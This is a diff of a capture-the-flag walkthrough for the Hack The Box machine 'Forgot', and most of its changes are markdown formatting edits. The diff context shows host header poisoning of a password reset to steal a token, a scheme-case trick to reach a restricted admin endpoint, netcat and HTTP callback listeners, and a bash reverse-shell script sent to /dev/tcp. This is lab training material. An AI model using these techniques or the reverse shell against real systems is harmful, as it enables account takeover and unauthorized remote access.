@@ -1,4 +1,4 @@
-#### Scanning
+# Scanning
 we start with nmap scan, which discovered 2 open  ports 22 and 80
 ```
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
@@ -88,7 +88,8 @@ by Ben "epi" Risher 🤓                 ver: 2.7.1
 in which `forgot` and `tickets` is a login page and `reset` is  a password reset form.
 
 From source code we find a username `robert-dev-1450222`. we tried host header poisioning in `/reset` page and found a vaild token 
-```┌──(kali㉿kali)-[~/workspace/HTB/machine/forgot]
+```
+┌──(kali㉿kali)-[~/workspace/HTB/machine/forgot]
 └─$ nc -nvlp 6565
 listening on [any] 6565 ...
 connect to [10.10.16.2] from (UNKNOWN) [10.129.72.49] 57426
@@ -106,7 +107,8 @@ follow to the link and set new password. login via username `robert-dev-1450222`
 `admin password cannot be reset` 
 while chehcking through the source code we find another endpoint named `admin_tickets` which is acces denied
 
-```<div class="header-2">
+```html
+<div class="header-2">
 
             <div id="menu-bar" class="fas fa-bars"></div>
 
@@ -133,7 +135,8 @@ so trieng to bypass that we changed the schema grom `http` to `HTtp` , which suc
 
 ![](/Hack-The-Box/forgot/img/3.png)
 Now we need to check for callback for that setup a python server and send the request
-```┌──(kali㉿kali)-[~/workspace/HTB/machine/forgot]
+```
+┌──(kali㉿kali)-[~/workspace/HTB/machine/forgot]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.188 - - [17/Nov/2022 09:55:56] "GET / HTTP/1.1" 200 -
@@ -162,7 +165,7 @@ User diego may run the following commands on forgot:
 ```
 
 
-```
+```Python
 #!/usr/bin/python3
 import sys
 import csv
@@ -335,7 +338,7 @@ For getting shell access:
 
 Create a file named `shell.sh` in `/tmp` directory with the following script and change its execute permission.
 
-```
+```Bash
 #!/bin/bash
 bash -i >&  /dev/tcp/ip/port 0>&1
 ```
